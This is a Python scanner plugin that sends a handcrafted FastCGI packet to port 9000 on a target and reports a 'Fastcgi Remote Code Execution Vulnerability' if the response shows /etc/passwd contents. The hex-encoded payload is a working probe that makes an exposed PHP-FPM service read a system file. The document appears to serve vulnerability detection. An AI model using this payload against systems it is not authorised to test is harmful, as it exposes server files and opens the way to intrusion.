#
import socket
from lib.common import save_user_script_result


def test_fastcgi(ip):
    data = """
    01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
    01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
    54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
    56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
    2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
    4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
    52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
    50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
    70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
    4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
    63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
    """
    data_s = ''
    for _ in data.split():
        data_s += chr(int(_, 16))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect((ip, 9000))
        sock.send(data_s)
        ret = sock.recv(1024)
        if ret.find(':root:') > 0:
            return True, ret
        else:
            return False, None
    except Exception as e:
        return False, None
    finally:
        sock.close()



def do_check(self, url):
    if url != '/':
        return
    host = self.host.split(':')[0]
    ret, txt = test_fastcgi(host)
    if ret:
        save_user_script_result(self, '', host + ':9000', 'Fastcgi Remote Code Execution Vulnerability')
